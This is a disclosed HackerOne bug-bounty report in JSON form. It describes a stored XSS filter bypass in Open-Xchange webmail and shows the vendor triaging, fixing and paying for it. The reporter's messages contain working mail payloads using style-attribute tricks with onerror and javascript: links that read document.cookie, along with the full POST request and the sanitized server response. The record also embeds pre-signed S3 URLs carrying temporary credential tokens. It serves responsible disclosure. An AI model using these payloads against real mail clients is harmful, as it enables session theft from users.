{"id":314204,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTQyMDQ=","url":"https://hackerone.com/reports/314204","title":"[XSS] Style/Event Filter Bypass v3.0","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-02-09T11:49:50.492Z","submitted_at":"2018-02-09T11:49:50.492Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"secator","url":"/secator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/057/075/665d5508baf6704a821e8b1dc79d6fda2f52389a_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-24T11:48:40.264Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-07-04T11:15:34.486Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi.\n\nNew ways to bypass filter in the mail.\nPrevious reports #279073, #244821\n\n1. onEvent filter bypass\n-\nIf add `{` in style, then onEvents filter disabled.\nSend e-mail:\n```json\n\"content\": \"\u003cimg src=x style=font:\\u0022'/{/onerror=alert(document.cookie)//\u003e\",\n```\nResponse:\n```json\n\"content\":\"\u003cimg src=\\\"x\\\" style='font:\\\"'/{/onerror=alert(document.cookie)//'\u003e\"\n```\n\n2. Without onEvents\n-\nWithout `{` you can using `\u003ca href='javascript:'\u003e`:\n```json\n\"content\": \"\u003ca style=font:\\u0022'href=javascript:alert(document.cookie)//\u003eaaa\u003c/a\u003e\",\n```\nResponse:\n```json\n\"content\":\"\u003ca style='font: \\\"'href=javascript:alert(document.cookie)//;'\u003eaaa\u003c/a\u003e\"\n```\n\n## Impact\n\nmalicious code injection \u0026\u0026 execute unwanted actions on a web application in which they're currently authenticated\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://sandbox.open-xchange.com/\n\n**Verified**\nYes\n\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":39,"voters":["prophet","ali","sudi","case81","eveeez","xcx","t4ym","exception","0xprometheus","ladysecspeare","and 29 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2374381,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thanks for your report, please add a mail/HTML source which shows the actual payload. The JSON \"content\" attribute is being generated as a result, it does not help a lot by identifying the root cause.","automated_response":false,"created_at":"2018-02-12T09:54:32.309Z","updated_at":"2018-02-12T09:54:32.309Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2374417,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hmm...\nPOST data:\n```\n------WebKitFormBoundaryDAgEe2LggPeTu5R5\nContent-Disposition: form-data; name=\"json_0\"\n\n{\n  \"from\": [\n    [\n      \"user3 user3q\",\n      \"user3@sandbox-1.open-xchange.com\"\n    ]\n  ],\n  \"subject\": \"test\",\n  \"priority\": 3,\n  \"sendtype\": 0,\n  \"csid\": \"251.1518429708042\",\n  \"initial\": true,\n  \"security\": {\n    \"encrypt\": false,\n    \"pgpInline\": false,\n    \"sign\": false\n  },\n  \"attachments\": [\n    {\n      \"content\": \"\u003cp\u003e\u003cimg src=x style=font:\\u0022'/{/onerror=alert(document.cookie)//\u003e\u003c/p\u003e\u003cp\u003e\u003ca style=font:\\u0022'href=javascript:alert(document.cookie)//\u003eaaa\u003c/a\u003e\u003c/p\u003e\",\n      \"content_type\": \"ALTERNATIVE\",\n      \"disp\": \"inline\",\n      \"filename\": \"\",\n      \"uploaded\": 1,\n      \"meta\": {}\n    }\n  ],\n  \"flags\": 4,\n  \"to\": [],\n  \"cc\": [],\n  \"bcc\": []\n}\n------WebKitFormBoundaryDAgEe2LggPeTu5R5--\n```\nResult:\n{F262568}\n```\n{\n  \"data\": {\n    \"folder_id\": \"default0/Drafts\",\n    \"id\": \"4\",\n    \"unread\": 0,\n    \"attachment\": false,\n    \"content_type\": \"text/html\",\n    \"size\": 686,\n    \"account_name\": \"E-Mail 1\",\n    \"account_id\": 0,\n    \"malicious\": false,\n    \"security_info\": {\n      \"encrypted\": false,\n      \"signed\": false\n    },\n    \"from\": [\n      [\n        \"user3 user3q\",\n        \"user3@sandbox-1.open-xchange.com\"\n      ]\n    ],\n    \"to\": [],\n    \"cc\": [],\n    \"bcc\": [],\n    \"subject\": \"test\",\n    \"sent_date\": 1518433451000,\n    \"received_date\": 1518433451000,\n    \"date\": 1518433451000,\n    \"flags\": 36,\n    \"user\": [],\n    \"color_label\": 0,\n    \"priority\": 3,\n    \"headers\": {\n      \"MIME-Version\": \"1.0\",\n      \"X-OX-Marker\": \"fd468756-f320-47a0-a110-dd840793851c\",\n      \"X-Mailer\": \"Open-Xchange Mailer v7.8.4-Rev22\",\n      \"Content-Transfer-Encoding\": \"7bit\",\n      \"X-Originating-Client\": \"open-xchange-appsuite\",\n      \"Reply-To\": \"user3 user3q \u003cuser3@sandbox-1.open-xchange.com\u003e\"\n    },\n    \"attachments\": [\n      {\n        \"id\": \"1\",\n        \"content_type\": \"text/html\",\n        \"truncated\": false,\n        \"sanitized\": true,\n        \"size\": 205,\n        \"disp\": \"inline\",\n        \"content\": \"\u003c!doctype html\u003e\\n\\n \\n \u003cdiv id=\\\"ox-bcb256188f\\\"\u003e\\n  \u003cp\u003e\u003cimg src=\\\"x\\\" style='font:\\\"'/{/onerror=alert(document.cookie)//'\u003e\u003c/p\u003e\\n  \u003cp\u003e\u003ca style='font: \\\"'href=javascript:alert(document.cookie)//;'\u003eaaa\u003c/a\u003e\u003c/p\u003e \\n \u003c/div\u003e\"\n      }\n    ],\n    \"modified\": 0,\n    \"msgref\": \"default0/Drafts/4\"\n  }\n}\n```\n","automated_response":false,"created_at":"2018-02-12T10:13:31.648Z","updated_at":"2018-02-12T10:13:31.648Z","actor":{"username":"secator","cleared":false,"url":"/secator","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/057/075/665d5508baf6704a821e8b1dc79d6fda2f52389a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":262568,"filename":"ox.xss.mail.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/262/568/9a03b3fba762cf39dfb69a4f1228594eef495deb/ox.xss.mail.png?response-content-disposition=attachment%3B%20filename%3D%22ox.xss.mail.png%22%3B%20filename%2A%3DUTF-8%27%27ox.xss.mail.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144348Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f749e09893cf78b9f42b8a07ecdfb6286fae3abdd687a7ea7bbacb7e9868d5b8"}],"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2374449,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Sorry, that might be misunderstood, i'm asking for the mail as .eml file. You can just use \"Save as file\" in App Suite to export such mails and add it as attachment here. The stuff you get via API is already sanitized or otherwise modified. So far i had no luck in using this payload in a manually crafted mail, so i'd be interested how the generated mail looks like.","automated_response":false,"created_at":"2018-02-12T10:26:30.178Z","updated_at":"2018-02-12T10:26:30.178Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2374469,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Oops :)\nI sent now from my server F262574","automated_response":false,"created_at":"2018-02-12T10:37:06.806Z","updated_at":"2018-02-12T10:37:06.806Z","actor":{"username":"secator","cleared":false,"url":"/secator","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/057/075/665d5508baf6704a821e8b1dc79d6fda2f52389a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":262574,"filename":"test!1518431684.4718.eml","type":"message/rfc822","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/262/574/ebfb7ea103b61679e811e6626554b1afaaeef922/test%211518431684.4718.eml?response-content-disposition=attachment%3B%20filename%3D%22test%211518431684.4718.eml%22%3B%20filename%2A%3DUTF-8%27%27test%211518431684.4718.eml\u0026response-content-type=message%2Frfc822\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144348Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=374f47b2e859a95d225a633c514d96f29c3f28d69774b2392feeacaa233b9e34"}],"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2374531,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Perfect, thanks!","automated_response":false,"created_at":"2018-02-12T10:54:57.670Z","updated_at":"2018-02-12T10:54:57.670Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2382016,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.","automated_response":false,"created_at":"2018-02-14T10:39:27.649Z","updated_at":"2018-02-14T10:39:27.649Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"secator","url":"/secator"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2382018,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-02-14T10:39:39.476Z","updated_at":"2018-02-14T10:39:39.476Z","actor":{"url":"/open-xchange","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Open-Xchange"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"open-xchange","collaborator":{"username":"secator","url":"/secator"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5253124,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-07-04T11:15:34.558Z","updated_at":"2019-07-04T11:15:34.558Z","first_to_agree":true,"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6860936,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2020-01-24T11:48:40.217Z","updated_at":"2020-01-24T11:48:40.217Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}